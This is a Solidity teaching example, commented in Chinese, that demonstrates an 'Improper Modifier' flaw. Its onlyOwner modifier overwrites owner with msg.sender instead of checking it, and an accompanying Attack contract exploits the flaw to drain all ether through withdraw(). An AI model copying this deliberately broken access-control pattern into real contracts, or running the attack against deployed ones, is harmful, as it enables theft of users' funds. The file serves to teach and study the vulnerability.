// Solidity version >=0.8.0
pragma solidity >=0.8.0;

/*
  漏洞描述: Improper Modifier
  在此漏洞範例中，我們定義了一個 modifier onlyOwner，原本意圖是用來限制只有合約的擁有者 (owner) 才能執行某些敏感操作，但實作上卻把 owner 的值誤設定為呼叫者 (msg.sender) 而非進行權限檢查。
  結果只要攻擊者呼叫了被 onlyOwner 修飾的函式，就能將 owner 變數設置成攻擊者的地址，進而利用 withdraw() 將合約內所有的 ether 提走。

  攻擊步驟:
  1. 攻擊者部署或發現此合約。
  2. 將合約內存入一定數量的 ether。
  3. 攻擊者透過 Attack 合約呼叫 withdraw() 函式，modifier 將 owner 重寫成攻擊者的地址，之後 withdraw() 會將所有的餘額轉帳到攻擊者。
*/

contract VulnerableContract {
    // 漏洞重點：owner 應該儲存合約建立時的擁有者，但在 modifier 中被錯誤地重新賦值。
    address public owner;

    // Improper Modifier 實作：錯誤地將 msg.sender 指派給 owner，而非檢查權限
    modifier onlyOwner() {
        // 錯誤：本來應該是檢查 msg.sender 是否等於 owner，但這裡卻直接將 owner 重新設定為 msg.sender
        owner = msg.sender;  // 漏洞重點
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    // 敏感操作：將合約內所有 ether 提走
    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    // 接收 Ether 的函式
    receive() external payable {}
}

// 攻擊合約：演示如何利用 Improper Modifier 漏洞
contract Attack {
    VulnerableContract public vulnerable;

    // 修改參數型態為 address payable 以解決編譯錯誤
    constructor(address payable _vulnerableAddress) {
        vulnerable = VulnerableContract(_vulnerableAddress);
    }

    // 攻擊步驟：先呼叫 withdraw()，由於 modifier 的漏洞，owner 將被設為攻擊者地址，進而轉移所有合約內 ether
    function attack() public {
        vulnerable.withdraw();
    }

    // 接收 VulnerableContract 轉帳的函式
    receive() external payable {}
}
